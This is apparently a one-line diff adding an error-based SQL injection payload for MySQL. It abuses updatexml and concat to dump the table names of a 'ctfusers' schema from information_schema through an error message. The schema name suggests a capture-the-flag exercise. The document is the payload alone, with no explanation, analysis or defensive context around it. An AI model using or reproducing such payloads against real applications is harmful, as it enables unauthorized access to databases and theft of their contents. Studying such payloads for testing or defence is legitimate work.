@@ -1,0 +1,1 @@
+' and updatexml(0,concat(0x7e,(select group_concat(TABLE_NAME) from information_schema.COLUMNS where TABLE_SCHEMA="ctfusers") ,0x7e)  ,0)#
